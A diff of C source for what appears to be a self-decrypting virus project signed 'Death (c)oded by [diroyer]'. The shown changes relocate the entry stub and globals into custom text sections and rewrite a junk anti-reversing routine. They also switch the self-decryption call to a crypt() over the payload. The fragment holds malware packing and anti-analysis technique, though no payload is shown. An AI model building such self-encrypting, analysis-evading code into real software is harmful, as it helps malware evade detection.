@@ -6,31 +6,10 @@
 #include "syscall.h"
 
 
-void decrypt_self(void);
+void	decrypt_self(void);
 void	entrypoint(int argc, char **argv, char **envp);
 
-//void __attribute__((naked, section(".text.start#"))) _start(void)
-//{
-//	__asm__ __volatile__ (
-//			"push %rdx\n"
-//			"movq 8(%rsp), %rdi\n"
-//			"leaq 16(%rsp), %rsi\n"
-//			"leaq 8(%rsi,%rdi,8), %rdx\n"
-//			"push %rdi\n"
-//			"push %rsi\n"
-//			"push %rdx\n"
-//			"call decrypt_self\n"
-//			"pop %rdx\n"
-//			"pop %rsi\n"
-//			"pop %rdi\n"
-//			"call entrypoint\n"
-//			"pop %rdx\n"
-//			".global jmp_end\n"
-//			"jmp_end:\n"
-//			"jmp real_end\n"
-//	);
-//}
-__attribute__((noreturn))
+__attribute__((noreturn, section(".text.start#")))
 void _start(void) {
 	__asm__ __volatile__ (
 		"push %rdx\n"
@@ -50,37 +29,45 @@ void _start(void) {
 	__builtin_unreachable();
 }
 
-__attribute__((noreturn))
+__attribute__((noreturn, section(".text.start#")))
 void __attribute__((naked)) jmp_end(void) {
 	__asm__ __volatile__ (
 		"jmp real_end\n"
 	);
 }
 
-char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
-	"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";
+#define TEXT_VAR __attribute__((section(".text#.vars")))
 
-uint8_t __attribute__((section(".text#")))	g_key[KEY_SIZE] = {0};
-bool __attribute__((section(".text#")))	    g_is_encrypted = false;
+char	TEXT_VAR g_signature[SIGNATURE_SIZE] = \
+"Death (c)oded by [diroyer] - deadbeaf:0000\n\0";
 
-int __attribute__((section(".text#")))	    g_start_offset = ORIG_TEXT_OFF;
-char __attribute__((section(".text#")))	    **g_envp;
+//uint8_t	TEXT_VAR g_key[KEY_SIZE] = {0};
+bool	TEXT_VAR g_is_encrypted = false;
+
+int		TEXT_VAR g_start_offset = ORIG_TEXT_OFF;
+char	TEXT_VAR **g_envp = NULL;
+unsigned int TEXT_VAR g_payload_size = 0;
 
 void junk_main(void) {
-	char c = 'A';
-	char *pc = &c;
-	char **ppc = &pc;
-	char ***pppc = &ppc;
-	char *weird = *(char **)(*(char ***) &pppc);
-	int result = *(int *)&weird * *(int *)&weird;
-	for (int i = 0; i < 100; i++) {
-		result += *(int *)&weird;
-		if (result > 0) {
-			result = *(int *)&weird;
-		} else if (result < 0) {
-			result = *(int *)&weird;
-		}
-	}
+	char hello[] = "dont reverse me :(";
+	uint8_t yolo = hello[0] ^ hello[1];
+	uint8_t *ptr = &yolo;
+	*ptr ^= hello[2];
+	*ptr ^= hello[3];
+	*ptr ^= hello[4];
+	*ptr ^= hello[5];
+	*ptr ^= hello[6];
+	*ptr += hello[8];
+	*ptr -= hello[9];
+	*ptr ^= hello[10];
+	*ptr *= hello[11];
+	*ptr %= hello[12];
+	*ptr &= hello[13];
+	*ptr |= hello[14];
+	*ptr <<= hello[15];
+	*ptr >>= hello[16];
+	*ptr ^= hello[17];
+	*ptr ^= hello[18];
 }
 
 void decrypt_self(void)
@@ -110,7 +97,8 @@ void decrypt_self(void)
 
 	}
 
-	void *start_addr = (void* )(uintptr_t)&real_start;
-	decrypt(start_addr, PAYLOAD_SIZE, g_key);
+	//void *start_addr = (void* )(uintptr_t)&real_start;
+	//decrypt(start_addr, PAYLOAD_SIZE, g_key);
+	crypt((uint8_t *)(uintptr_t)&real_start, g_payload_size);
 	return;
 }
